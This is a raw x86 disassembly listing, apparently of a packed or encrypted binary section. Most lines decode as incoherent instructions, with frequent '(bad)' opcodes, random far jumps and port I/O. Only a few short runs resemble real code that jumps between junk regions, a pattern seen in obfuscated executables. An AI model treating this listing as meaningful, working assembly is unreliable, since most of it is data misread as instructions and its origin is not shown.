  41002c:	test   DWORD PTR [edx],esp
  41002e:	inc    eax
  41002f:	test   BYTE PTR [eax],0x4b
  410032:	push   cs
  410033:	inc    ebp
  410034:	pop    esi
  410035:	xor    al,bh
  410037:	add    BYTE PTR [edx],ch
  410039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41003a:	ret    0x621f
  41003d:	imul   ebp,edx,0xa9e082cd
  410043:	out    dx,eax
  410044:	gs cwde 
  410046:	inc    esi
  410047:	stos   BYTE PTR es:[edi],al
  410048:	push   es
  410049:	cld    
  41004a:	xlat   BYTE PTR ds:[ebx]
  41004b:	and    edi,DWORD PTR [edi+0x568b7ab7]
  410051:	lock or eax,0x95b3b820
  410057:	push   ds
  410058:	add    eax,0x4672fbad
  41005d:	stos   BYTE PTR es:[edi],al
  41005e:	pop    edi
  41005f:	xchg   esp,eax
  410060:	fldenv [eax+0x514fbb52]
  410066:	popf   
  410067:	int3   
  410068:	inc    edx
  410069:	int    0x2b
  41006b:	xor    eax,0x74e488d5
  410070:	dec    ebp
  410071:	and    bh,ch
  410073:	sub    BYTE PTR [edx+0x5ae83092],dl
  410079:	cmc    
  41007a:	out    dx,al
  41007b:	outs   dx,BYTE PTR ds:[esi]
  41007c:	leave  
  41007d:	jno    0x4100d0
  41007f:	das    
  410080:	pushf  
  410081:	test   eax,0x62fe2587
  410086:	sti    
  410087:	in     eax,dx
  410088:	mov    esi,0x2d49718
  41008d:	stos   BYTE PTR es:[edi],al
  41008e:	aam    0xf0
  410090:	lahf   
  410091:	adc    bl,al
  410093:	sbb    edx,DWORD PTR [ebx]
  410095:	or     eax,0xa1f0caff
  41009a:	add    esp,ecx
  41009c:	or     DWORD PTR [edi+0x29],esp
  41009f:	push   edi
  4100a0:	ins    BYTE PTR es:[edi],dx
  4100a1:	xchg   ebx,eax
  4100a2:	mov    al,ds:0xab7127a7
  4100a7:	mov    ah,0x82
  4100a9:	fisttp QWORD PTR [eax+eax*1]
  4100ac:	push   ebx
  4100ad:	xchg   edi,eax
  4100ae:	sbb    eax,0x9ca2a72a
  4100b3:	out    0x87,al
  4100b5:	mov    eax,ds:0x636437bb
  4100ba:	push   0x4491e409
  4100bf:	(bad)  
  4100c0:	shl    DWORD PTR ds:0xe0454dd8,cl
  4100c6:	mov    al,ds:0xd2774adc
  4100cb:	sub    ecx,DWORD PTR [edx+0x75]
  4100ce:	pushf  
  4100cf:	stos   BYTE PTR es:[edi],al
  4100d0:	dec    ecx
  4100d1:	fst    DWORD PTR [ebx]
  4100d3:	rcl    BYTE PTR [bx+di],0x57
  4100d7:	rcl    dh,cl
  4100d9:	fidivr DWORD PTR [edi-0x45]
  4100dc:	je     0x410086
  4100de:	loopne 0x410071
  4100e0:	pushf  
  4100e1:	ss stc 
  4100e3:	rcr    esp,0x83
  4100e6:	or     al,0x93
  4100e8:	jp     0x41013a
  4100ea:	jg     0x410123
  4100ec:	push   edx
  4100ed:	ficom  WORD PTR [ecx+0x67b22ccd]
  4100f3:	fldenv [ebx+0x6d]
  4100f6:	add    dh,BYTE PTR [edi+ebp*8+0x63]
  4100fa:	fs xchg ecx,eax
  4100fc:	push   ss
  4100fd:	inc    ecx
  4100fe:	and    bh,BYTE PTR [edi+0x406f7ab2]
  410104:	repz sbb eax,0x5c00ebb8
  41010a:	shl    cl,0x39
  41010d:	scas   al,BYTE PTR es:[edi]
  41010e:	cmp    DWORD PTR [edi-0x52c6e61e],ebp
  410114:	push   0xffffff86
  410116:	lds    eax,FWORD PTR [ecx+edi*8-0x803243]
  41011d:	xchg   ebx,eax
  41011e:	cmp    ecx,DWORD PTR ds:0x2439651f
  410124:	push   esi
  410125:	push   esp
  410126:	cdq    
  410127:	mov    dl,0xfd
  410129:	inc    edi
  41012a:	test   BYTE PTR [edx],dl
  41012c:	retf   
  41012d:	scas   al,BYTE PTR es:[edi]
  41012e:	adc    al,0xd9
  410130:	aad    0x5
  410132:	arpl   bp,sp
  410134:	xor    dl,BYTE PTR [ebp+0x10072ee2]
  41013a:	cmp    edx,DWORD PTR [eax+eax*1]
  41013d:	iret   
  41013e:	(bad)  
  41013f:	mov    edx,0x69c92b38
  410144:	fistp  DWORD PTR [ebx]
  410146:	pop    edi
  410147:	imul   eax,DWORD PTR [edx-0x5f],0x28
  41014b:	ins    DWORD PTR es:[edi],dx
  41014c:	push   ecx
  41014d:	and    ebx,ecx
  41014f:	push   es
  410150:	fscale 
  410152:	mov    al,ds:0x58c53b81
  410157:	or     BYTE PTR [eax+edi*4],ah
  41015a:	mov    fs,WORD PTR [ebp-0x24]
  41015d:	inc    ebp
  41015e:	outs   dx,BYTE PTR ds:[esi]
  41015f:	cmc    
  410160:	cld    
  410161:	loope  0x410132
  410163:	scas   al,BYTE PTR es:[edi]
  410164:	imul   edi,DWORD PTR [ecx+0x6b018480],0x49716a36
  41016e:	cmp    ebx,DWORD PTR [ecx]
  410170:	inc    ebx
  410171:	add    edi,esi
  410173:	aam    0x5d
  410175:	and    edi,DWORD PTR [ebx+ebx*1+0x1d]
  410179:	(bad)  
  41017b:	push   ebp
  41017c:	call   0xd6a:0x83e42916
  410183:	add    al,0x7e
  410185:	mov    bh,0x20
  410187:	inc    ecx
  410188:	xchg   esi,eax
  410189:	adc    DWORD PTR [edx+0x5f06ecb4],edi
  41018f:	mov    esi,DWORD PTR [eax-0x17dd9246]
  410195:	es ret 0x4693
  410199:	push   eax
  41019a:	pop    ss
  41019b:	repz out dx,al
  41019d:	jae    0x4101c8
  41019f:	push   0x3a179eaf
  4101a4:	cli    
  4101a5:	fadd   DWORD PTR [eax]
  4101a7:	xchg   BYTE PTR [ebp+0x46210899],ah
  4101ad:	jl     0x41016f
  4101af:	pop    eax
  4101b0:	cli    
  4101b1:	sub    DWORD PTR [ebx-0x6b],edx
  4101b4:	fst    st(4)
  4101b6:	cmp    DWORD PTR [ecx+ebp*1],eax
  4101b9:	out    dx,al
  4101ba:	inc    eax
  4101bb:	stos   BYTE PTR es:[edi],al
  4101bc:	fs dec ecx
  4101be:	sbb    BYTE PTR [esi-0x4c2272d3],bl
  4101c4:	sbb    bh,BYTE PTR [ecx+0xb]
  4101c7:	mov    edi,0xc6cc0fe6
  4101cc:	mov    cl,0x13
  4101ce:	retf   
  4101cf:	out    0x7b,al
  4101d1:	scas   eax,DWORD PTR es:[edi]
  4101d2:	or     eax,0x84ac73f4
  4101d7:	pop    ss
  4101d8:	lds    eax,FWORD PTR [esp+edx*4-0x44e425e2]
  4101df:	mov    al,0xd9
  4101e1:	rol    DWORD PTR [edx],cl
  4101e3:	popf   
  4101e4:	cmp    al,BYTE PTR [edx+0x55]
  4101e7:	cmp    eax,0x719ac371
  4101ec:	jae    0x410224
  4101ee:	add    DWORD PTR [ecx+0x1913f774],ebx
  4101f4:	sbb    esp,DWORD PTR [edx]
  4101f6:	cs in  eax,dx
  4101f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101f9:	fmul   DWORD PTR [eax+ebp*8]
  4101fc:	or     DWORD PTR [ebx-0x1d],0x60959f6e
  410203:	inc    eax
  410204:	(bad)  
  410205:	mov    ebp,0x642f8435
  41020a:	mov    eax,ds:0xa404fa16
  41020f:	icebp  
  410210:	nop
  410211:	add    al,0x46
  410213:	or     al,0xfa
  410215:	pusha  
  410216:	jle    0x4101c8
  410218:	push   cs
  410219:	xor    al,0x9a
  41021b:	push   es
  41021c:	jne    0x4101f5
  41021e:	dec    esp
  41021f:	pushf  
  410220:	mov    ds:0xb85603cf,eax
  410225:	sbb    eax,0xae2e92ca
  41022a:	jmp    0x2329:0x63565fc0
  410231:	dec    ecx
  410232:	xor    al,0xb8
  410234:	mov    bl,0x75
  410236:	jmp    0x4102a4
  410238:	test   eax,0xd9fee4d9
  41023d:	inc    ebx
  41023e:	aam    0xe0
  410240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410241:	cmp    BYTE PTR [ebx+0x5f],al
  410244:	push   esi
  410245:	and    eax,DWORD PTR [ecx-0x4]
  410248:	out    dx,eax
  410249:	xchg   esp,eax
  41024a:	cmp    ebx,DWORD PTR [eax]
  41024c:	out    0xfc,al
  41024e:	ds pop ecx
  410250:	stc    
  410251:	mov    cl,bl
  410253:	fst    QWORD PTR [ebx-0x3b]
  410256:	stos   DWORD PTR es:[edi],eax
  410257:	arpl   WORD PTR [ebx+0x1d26d160],cx
  41025d:	fcom   QWORD PTR ds:0xdb0718b7
  410263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410264:	aas    
  410265:	cdq    
  410266:	push   eax
  410267:	out    0x5b,al
  410269:	loope  0x410240
  41026b:	daa    
  41026c:	sbb    bh,BYTE PTR [ebx+ecx*4]
  41026f:	cld    
  410270:	icebp  
  410271:	ds rcl bl,0xcf
  410275:	ficom  WORD PTR [edi-0x64c198df]
  41027b:	lods   al,BYTE PTR ds:[esi]
  41027c:	sbb    DWORD PTR [eax],0x30
  41027f:	or     eax,0x61f701b4
  410284:	fdiv   QWORD PTR [eax]
  410286:	xor    esi,DWORD PTR [eax-0x3]
  410289:	and    ecx,esi
  41028b:	xchg   esi,eax
  41028c:	popf   
  41028d:	call   0xcd0a:0xf5c3c344
  410294:	icebp  
  410295:	mov    ah,ah
  410297:	adc    eax,0x36ea02f4
  41029c:	pop    ecx
  41029d:	jmp    0xc1bc:0xfd0679a2
  4102a4:	dec    ecx
  4102a5:	mov    ds:0xdb4cb8de,eax
  4102aa:	mov    ah,0x8d
  4102ac:	lds    esp,FWORD PTR [ecx]
  4102ae:	test   DWORD PTR [ebx-0x7c],0x4e13a864
  4102b5:	stos   DWORD PTR es:[edi],eax
  4102b6:	and    al,0xb7
  4102b8:	xchg   edx,eax
  4102b9:	jmp    0x927d3513
  4102be:	sbb    esp,ecx
  4102c0:	jae    0x410263
  4102c2:	push   eax
  4102c3:	mov    edx,0xee448f05
  4102c8:	sub    esp,DWORD PTR [ebx+0x93b7ba5]
  4102ce:	hlt    
  4102cf:	int    0xa4
  4102d1:	push   ss
  4102d2:	fstp   QWORD PTR [eax+edi*4-0x1f5a31e3]
  4102d9:	fsubr  st(0),st
  4102db:	push   edi
  4102dc:	ins    BYTE PTR es:[edi],dx
  4102dd:	ret    
  4102de:	ins    DWORD PTR es:[edi],dx
  4102df:	(bad)  
  4102e1:	or     BYTE PTR [edi+edx*4-0x3effbc3c],0xb3
  4102e9:	lea    ecx,[eax+0xd]
  4102ec:	ror    al,0x1b
  4102ef:	pop    ebx
  4102f0:	stos   DWORD PTR es:[edi],eax
  4102f1:	fwait
  4102f2:	lahf   
  4102f3:	jle    0x4102a0
  4102f5:	addr16 dec eax
  4102f7:	outs   dx,BYTE PTR ds:[esi]
  4102f8:	push   ds
  4102f9:	xchg   esp,eax
  4102fa:	sbb    dl,BYTE PTR [edi+esi*8+0x46]
  4102fe:	mov    BYTE PTR [edi],bl
  410300:	sub    al,0x11
  410302:	(bad)  
  410303:	dec    ecx
  410304:	mov    dl,0x58
  410306:	fldenv [edi+0x0]
  410309:	out    0xbd,al
  41030b:	or     eax,0x17948904
  410310:	sub    ebx,DWORD PTR [edi-0x77]
  410313:	push   cs
  410314:	(bad)  
  410315:	cmp    edx,DWORD PTR [ebx-0x63a0435b]
  41031b:	jle    0x410331
  41031d:	rol    BYTE PTR [esp-0x4cb5b25c],1
  410324:	push   esi
  410325:	ror    DWORD PTR [ebx],0x34
  410328:	pop    es
  410329:	inc    edx
  41032a:	xchg   ecx,eax
  41032b:	aaa    
  41032c:	out    dx,eax
  41032d:	or     al,0xe4
  41032f:	jp     0x410309
  410331:	push   esp
  410332:	mov    ch,0xf2
  410334:	sbb    DWORD PTR [ebp+0x43],eax
  410337:	int    0x4a
  410339:	and    esp,0x62
  41033c:	mov    ecx,0x1f82d7aa
  410341:	jp     0x4102cb
  410343:	cmp    DWORD PTR [edx],0xf883d2d8
  410349:	push   ds
  41034a:	or     BYTE PTR [ecx+0x7d],ah
  41034d:	les    edx,FWORD PTR [edx+0x7d49f29a]
  410353:	xor    BYTE PTR [edx+0x71b04cf3],dl
  410359:	(bad)  
  41035a:	out    dx,al
  41035b:	push   ecx
  41035c:	sub    eax,0x5c713fab
  410362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410363:	push   eax
  410364:	or     BYTE PTR [eax-0x7e],0xfa
  410368:	xor    esi,edi
  41036a:	push   ds
  41036b:	mov    fs,ebp
  41036d:	js     0x41036a
  41036f:	mov    DWORD PTR [edx-0x776937ce],esp
  410375:	sahf   
  410376:	mov    esi,0x7829623e
  41037b:	ffree  st(1)
  41037d:	dec    esi
  41037e:	popa   
  41037f:	std    
  410380:	jmp    0xb62d002f
  410385:	or     ah,ch
  410387:	push   eax
  410388:	inc    esi
  410389:	mov    bh,0x8b
  41038b:	pushf  
  41038c:	mov    ah,0x3f
  41038e:	add    BYTE PTR [edx-0x61],bl
  410391:	jo     0x410406
  410393:	and    BYTE PTR [edx-0x77],0x4d
  410397:	or     BYTE PTR ds:0x2082,al
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd05
  4103a6:	add    ecx,DWORD PTR ds:0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x7e68:0x2a13bab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	jo     0x410447
  4103dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103dd:	lar    ecx,WORD PTR [edi+0x48eac180]
  4103e4:	mov    ecx,0xd36bf8ca
  4103e9:	mov    eax,0xac2c701b
  4103ee:	and    cl,BYTE PTR [eax]
  4103f0:	fs sbb ecx,eax
  4103f3:	and    eax,0x4aeec309
  4103f8:	retf   
  4103f9:	fwait
  4103fa:	dec    esi
  4103fb:	loopne 0x410426
  4103fd:	cld    
  4103fe:	jmp    0xd40f4b9d
  410403:	pop    ebp
  410404:	push   edi
  410405:	push   eax
  410406:	or     bl,bl
  410408:	push   ebx
  410409:	jge    0x4103a8
  41040b:	setne  BYTE PTR [ebp-0x2c]
  41040f:	jbe    0x4103ad
  410411:	into   
  410412:	pop    esi
  410413:	and    bh,BYTE PTR [ecx]
  410415:	test   DWORD PTR [ebp-0x6eab40ae],edi
  41041b:	repz mov edi,0x772d846
  410421:	hlt    
  410422:	add    edx,DWORD PTR [ecx-0x1d]
  410425:	pop    eax
  410426:	iret   
  410427:	sub    esi,DWORD PTR [ebx]
  410429:	lea    esp,[edx]
  41042b:	mov    esp,0x91ff3e1d
  410430:	hlt    
  410431:	stc    
  410432:	jbe    0x4103fb
  410434:	pop    ebp
  410435:	or     cl,bl
  410437:	test   BYTE PTR [ebp-0x6],ah
  41043a:	pop    eax
  41043b:	jle    0x4103e6
  41043d:	or     eax,0x685bf800
  410442:	mov    BYTE PTR [ebx-0x12e13df8],dh
  410448:	call   0x6769:0x4716f9a9
  41044f:	enter  0xcdcb,0xfa
  410453:	mov    bh,0x25
  410455:	add    DWORD PTR [edx+0x20],ebx
  410458:	sub    DWORD PTR [ebx-0x479a40fd],ebp
  41045e:	gs leave 
  410460:	cs stos DWORD PTR es:[edi],eax
  410462:	mov    esi,0x21298de
  410467:	mov    dh,0xb4
  410469:	jg     0x410446
  41046b:	shl    DWORD PTR [esi+0x5c],1
  41046e:	inc    eax
  41046f:	das    
  410470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410471:	lods   al,BYTE PTR ds:[esi]
  410472:	not    DWORD PTR [edi]
  410474:	call   DWORD PTR [ebp+0x3e7d6960]
  41047a:	add    edx,DWORD PTR [ecx-0x65]
  41047d:	and    eax,0x5bba7349
  410482:	jg     0x4104e7
  410484:	push   es
  410485:	inc    ebp
  410486:	shr    BYTE PTR [eax+0x6925d109],0x9a
  41048d:	and    eax,0xe8fffec1
  410492:	jmp    0xb9d0cd25
  410497:	mov    eax,ds:0x796cabaf
  41049c:	mov    ecx,0x69237def
  4104a1:	bnd jge 0x410495
  4104a4:	and    al,0x7e
  4104a6:	aam    0x8e
  4104a8:	jbe    0x41048e
  4104aa:	push   edi
  4104ab:	mov    edx,0xdc8f8b9c
  4104b0:	sbb    BYTE PTR [ebp-0x35c1556c],bh
  4104b6:	mov    esp,0xf6c44375
  4104bb:	and    al,0x48
  4104bd:	sar    DWORD PTR [eax-0x640baebf],cl
  4104c3:	cs xor al,0xa5
  4104c6:	scas   eax,DWORD PTR es:[edi]
  4104c7:	ins    DWORD PTR es:[edi],dx
  4104c8:	pop    ss
  4104c9:	cli    
  4104ca:	push   ecx
  4104cb:	jmp    0xbe7db191
  4104d0:	pop    ebp
  4104d1:	dec    eax
  4104d2:	and    DWORD PTR [edi-0x59],ebp
  4104d5:	ds icebp 
  4104d7:	(bad)  
  4104d8:	mov    cl,0xd
  4104da:	(bad)  
  4104db:	jmp    0x410513
  4104dd:	sbb    al,0x5c
  4104df:	dec    ebp
  4104e0:	dec    DWORD PTR [ebx]
  4104e2:	arpl   sp,bx
  4104e4:	shr    ah,0x74
  4104e7:	fbld   TBYTE PTR [edx-0x75]
  4104ea:	cmp    al,0x9f
  4104ec:	(bad)  
  4104ed:	(bad)  
  4104ee:	(bad)  
  4104ef:	and    esi,DWORD PTR ds:0x8359eeec
  4104f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104f6:	iret   
  4104f7:	setl   BYTE PTR [esi+0x761a88f3]
  4104fe:	inc    edi
  4104ff:	cld    
  410500:	xchg   esp,eax
  410501:	loop   0x410576
  410503:	scas   eax,DWORD PTR es:[edi]
  410504:	and    al,0x49
  410506:	sbb    al,0xb0
  410508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410509:	push   esi
  41050a:	xchg   esi,eax
  41050b:	xor    ah,bl
  41050d:	jle    0x4104e4
  41050f:	js     0x410546
  410511:	pop    ss
  410512:	jb     0x410498
  410514:	int3   
  410515:	cld    
  410516:	loopne 0x410519
  410518:	into   
  410519:	dec    ebx
  41051a:	push   edi
  41051b:	fidivr WORD PTR [edx]
  41051d:	sbb    DWORD PTR [ecx-0x6a0c95fa],ebx
  410523:	sbb    eax,0x5f33294d
  410528:	sbb    eax,0xb1fcea71
  41052d:	je     0x4104d4
  41052f:	es pop edi
  410531:	test   eax,ebp
  410533:	pop    ds
  410534:	clc    
  410535:	add    DWORD PTR [ecx-0x3463bd70],esp
  41053b:	test   DWORD PTR [edi+0x16cc6b9c],eax
  410541:	pop    ds
  410542:	test   eax,0x4e3758d0
  410547:	inc    ebp
  410548:	pop    ebp
  410549:	mov    edx,esi
  41054b:	dec    ebx
  41054c:	popa   
  41054d:	sbb    DWORD PTR [esi-0x22979940],ebx
  410553:	shl    BYTE PTR [eax],1
  410555:	rcl    ecx,1
  410557:	sub    ebp,edx
  410559:	les    ecx,FWORD PTR [edx-0x7d]
  41055c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41055d:	dec    ebp
  41055e:	inc    eax
  41055f:	ret    0xceb8
  410562:	shl    BYTE PTR [ebp+0x181120c0],0xf0
  410569:	call   0xdb62:0x611e3a87
  410570:	mov    esp,ebx
  410572:	js     0x4105a9
  410574:	pop    ebx
  410575:	call   0x7383a12e
  41057a:	jge    0x410583
  41057c:	jl     0x41054c
  41057e:	scas   al,BYTE PTR es:[edi]
  41057f:	outs   dx,BYTE PTR ds:[esi]
  410580:	fsubr  st,st(5)
  410582:	xor    BYTE PTR [ebx],al
  410584:	sub    eax,0x3d0f69f1
  410589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41058a:	sbb    bh,ch
  41058c:	pop    ebp
  41058d:	jge    0x410597
  41058f:	(bad)  
  410590:	cmp    DWORD PTR [ebp+0x359d67a3],ebp
  410596:	outs   dx,DWORD PTR ds:[esi]
  410597:	test   al,0x51
  410599:	push   edi
  41059a:	ins    BYTE PTR es:[edi],dx
  41059b:	push   ecx
  41059c:	aaa    
  41059d:	add    edi,0x13
  4105a0:	test   DWORD PTR [edx-0x16b783f4],ecx
  4105a6:	jns    0x410537
  4105a8:	xor    DWORD PTR [ebp+0x63],esp
  4105ab:	xor    al,0x4
  4105ad:	mov    bl,BYTE PTR [ebx+0x74730e73]
  4105b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105b4:	push   ecx
  4105b5:	mov    eax,DWORD PTR [edi]
  4105b7:	add    al,0x70
  4105b9:	les    eax,FWORD PTR [eax]
  4105bb:	dec    ebx
  4105bc:	pop    edi
  4105bd:	cmp    DWORD PTR [eax],0x1b165c97
  4105c3:	inc    ebp
  4105c4:	add    esi,DWORD PTR [ebx]
  4105c6:	lods   al,BYTE PTR ds:[esi]
  4105c7:	nop
  4105c8:	adc    eax,ebp
  4105ca:	jb     0x4105c7
  4105cc:	mov    al,ds:0x917fda2
  4105d1:	mov    cl,0x6b
  4105d3:	fdivrp st(3),st
  4105d5:	adc    eax,DWORD PTR [ebx-0x1f]
  4105d8:	xchg   ebx,eax
  4105d9:	pop    esp
  4105da:	out    dx,al
  4105db:	lock mov eax,ds:0x6d51e847
  4105e1:	push   cs
  4105e2:	adc    ebx,edi
  4105e4:	jnp    0x4105af
  4105e6:	jmp    0x704eae23
  4105eb:	or     ebp,DWORD PTR [ecx]
  4105ed:	sub    BYTE PTR [ebp+0x779d60ab],ch
  4105f3:	out    dx,eax
  4105f4:	and    al,0x41
  4105f6:	mov    ch,0x9b
  4105f8:	jmp    0xbf212884
  4105fd:	mov    eax,0x5b071659
  410602:	xchg   BYTE PTR [esi+eiz*1-0x12394887],bl
  410609:	mov    al,0x8a
  41060b:	xchg   ecx,eax
  41060c:	ror    BYTE PTR [edi],1
  41060e:	dec    edi
  41060f:	and    BYTE PTR [ecx-0x340be34f],0x99
  410616:	xchg   edi,eax
  410617:	add    BYTE PTR es:[edx-0x2e2d9d56],dh
  41061e:	popf   
  41061f:	jno    0x4105a8
  410621:	sub    dl,BYTE PTR [ecx-0x7c]
  410624:	adc    BYTE PTR [edi-0x12],ah
  410627:	mov    eax,ds:0xa5a796e
  41062c:	addr16 pop ebx
  41062e:	stos   BYTE PTR es:[edi],al
  41062f:	lds    eax,FWORD PTR [eax]
  410631:	lods   eax,DWORD PTR ds:[esi]
  410632:	pop    ss
  410633:	into   
  410634:	adc    al,0xec
  410636:	mov    cl,0xd9
  410638:	or     eax,0xc3894539
  41063d:	cmp    esp,edx
  41063f:	js     0x4106aa
  410641:	adc    eax,0x8d4ac958
  410646:	and    edi,DWORD PTR [ebp+0x30eecd09]
  41064c:	ja     0x410684
  41064e:	inc    eax
  41064f:	mov    ch,0x48
  410651:	and    dl,BYTE PTR [ecx+0x65bf8f60]
  410657:	sbb    al,0x2a
  410659:	xor    eax,0xd254c0b3
  41065e:	and    al,0x5
  410660:	and    al,0x2d
  410662:	test   BYTE PTR [esi+0x3c363658],cl
  410668:	push   cs
  410669:	adc    DWORD PTR [edx-0x17060496],0xf6014d51
  410673:	add    al,0x2e
  410675:	call   0x9cc:0x1a771cb0
  41067c:	(bad)  
  41067d:	aas    
  41067e:	ins    BYTE PTR es:[edi],dx
  41067f:	stc    
  410680:	and    esp,DWORD PTR [ebp-0x37b90bc4]
  410686:	test   DWORD PTR [ecx],edx
  410688:	dec    edx
  410689:	add    BYTE PTR [edx-0x1fe6861c],dl
  41068f:	int3   
  410690:	sbb    eax,0xefd9b197
  410695:	and    eax,0x58277079
  41069a:	addr16 out 0x9f,eax
  41069d:	lea    eax,[ecx]
  41069f:	and    eax,0xb340fcba
  4106a4:	xor    BYTE PTR [ebx],al
  4106a6:	add    edx,DWORD PTR [edx]
  4106a8:	repz cmc 
  4106aa:	mov    cs,WORD PTR [ebp+0x23]
  4106ad:	leave  
  4106ae:	shl    DWORD PTR [ebx+0x334735c9],cl
  4106b4:	mov    ebp,0x4b5611d1
  4106b9:	xor    DWORD PTR [edi+0x4356da42],esi
  4106bf:	out    dx,al
  4106c0:	sar    eax,cl
  4106c2:	pop    esp
  4106c3:	jmp    0x3214:0xba897699
  4106ca:	shl    BYTE PTR [edx-0x7],cl
  4106cd:	jmp    DWORD PTR [edi+0x32]
  4106d0:	adc    DWORD PTR [ebp+0x5103e29c],edx
  4106d6:	sti    
  4106d7:	xchg   esp,eax
  4106d8:	jns    0x4106cb
  4106da:	test   al,0xd2
  4106dc:	or     eax,0xd43da705
  4106e1:	inc    edx
  4106e2:	cs test esi,0x86e1dbf6
  4106e9:	and    al,0x4b
  4106eb:	out    0xd9,eax
  4106ed:	daa    
  4106ee:	jle    0x4106cf
  4106f0:	fnstenv es:[eax+0x1f]
  4106f4:	mov    esp,0xcce3ad08
  4106f9:	jmp    0x58cc:0xeab08450
  410700:	mov    ds:0xa0ad9f88,al
  410705:	pop    edi
  410706:	add    edx,DWORD PTR [eax]
  410708:	adc    al,0x61
  41070a:	cmp    esp,DWORD PTR [esi-0x51192887]
  410710:	pop    ecx
  410711:	(bad)  [ecx+ebp*8+0x46]
  410715:	cld    
  410716:	jle    0x410706
  410718:	scas   eax,DWORD PTR es:[edi]
  410719:	dec    esp
  41071a:	pop    edx
  41071b:	adc    ch,BYTE PTR [edx]
  41071d:	sbb    esp,DWORD PTR ds:0x21a8b2e1
  410723:	sub    eax,0x5b0559c6
  410728:	cli    
  410729:	(bad)  
  41072a:	mov    edx,0x52ed5bf8
  41072f:	in     al,dx
  410730:	pop    edx
  410731:	int    0xb9
  410733:	sub    eax,0x940068a7
  410738:	push   es
  410739:	add    BYTE PTR [edx],cl
  41073b:	psllw  mm0,QWORD PTR [edi]
  41073e:	dec    esi
  41073f:	retf   0x531c
  410742:	xor    BYTE PTR [edx+0x6f],dh
  410745:	xor    dl,BYTE PTR [ecx-0x6a51303c]
  41074b:	mov    BYTE PTR [ebx-0x25c9cdd4],bl
  410751:	repnz dec ecx
  410753:	xor    eax,0xc9c2c78
  410758:	test   al,0x3b
  41075a:	jg     0x41073a
  41075c:	or     al,0x8e
  41075e:	in     eax,0xc7
  410760:	pop    esp
  410761:	out    dx,eax
  410762:	dec    edx
  410763:	in     eax,0x17
  410765:	popa   
  410766:	test   eax,0xa9007e64
  41076b:	cs jo  0x4107dd
  41076e:	jnp    0x41077b
  410770:	push   ebp
  410771:	daa    
  410772:	or     al,BYTE PTR [ebx+0x25]
  410775:	(bad)  
  410776:	push   ecx
  410777:	mov    eax,ds:0xe112a1d
  41077c:	push   eax
  41077d:	fild   DWORD PTR [edi+0x5b96dbed]
  410783:	sub    cl,dh
  410785:	inc    ebp
  410786:	xchg   ecx,eax
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	push   ebp
  4107a9:	in     eax,0xf
  4107ab:	pop    ss
  4107ac:	mov    eax,DWORD PTR [esi+0x70]
  4107af:	jo     0x410754
  4107b1:	jge    0x410823
  4107b3:	jo     0x410821
  4107b5:	lds    ebx,FWORD PTR [eax-0x37]
  4107b8:	pushf  
  4107b9:	stos   BYTE PTR es:[edi],al
  4107ba:	mov    ebx,0x1f513575
  4107bf:	(bad)  
  4107c0:	adc    DWORD PTR [edi+0x709db405],ebp
  4107c6:	loopne 0x410838
  4107c8:	aas    
  4107c9:	xchg   ebp,eax
  4107ca:	mov    edi,0xfc963f27
  4107cf:	hlt    
  4107d0:	rcl    dh,cl
  4107d2:	les    edi,FWORD PTR [ecx-0x34]
  4107d5:	retf   
  4107d6:	cmp    eax,esp
  4107d8:	jbe    0x4107b4
  4107da:	lock xlat BYTE PTR ds:[ebx]
  4107dc:	jle    0x4107de
  4107de:	ds ja  0x4107c6
  4107e1:	xchg   esp,eax
  4107e2:	into   
  4107e3:	adc    dh,al
  4107e5:	iret   
  4107e6:	xchg   ebx,eax
  4107e7:	mov    ch,0x90
  4107e9:	cmp    DWORD PTR [edi],eax
  4107eb:	mov    ss,edx
  4107ed:	retf   0xfecc
  4107f0:	mov    es,WORD PTR [ecx+0x8]
  4107f3:	jge    0x410858
  4107f5:	xor    BYTE PTR [ebp+0x792eb1f1],bh
  4107fb:	mov    eax,ds:0xfdee5df2
  410800:	call   0x82e8:0x373a6856
  410807:	sar    BYTE PTR ds:0x1eb4c1da,0x5e
  41080e:	mov    eax,ds:0x115b0ada
  410813:	fs inc edx
  410815:	(bad)  
  410816:	mov    ebx,0x2e682dab
  41081b:	add    ebp,DWORD PTR [ebp-0x2532cf65]
  410821:	or     DWORD PTR [esi-0x69],ecx
  410824:	push   ecx
  410825:	jns    0x410862
  410827:	scas   eax,DWORD PTR es:[edi]
  410828:	dec    ecx
  410829:	ror    DWORD PTR [eax],0x16
  41082c:	cwde   
  41082d:	ins    DWORD PTR es:[edi],dx
  41082e:	ds stos BYTE PTR es:[edi],al
  410830:	fisub  WORD PTR [eax]
  410832:	mov    ecx,0xf15aeab0
  410837:	or     eax,DWORD PTR [ecx-0x3a70357a]
  41083d:	xor    DWORD PTR [esi],ecx
  41083f:	push   ebx
  410840:	lds    edi,FWORD PTR [eax-0x16b87c47]
  410846:	(bad)  
  410847:	sbb    al,0x31
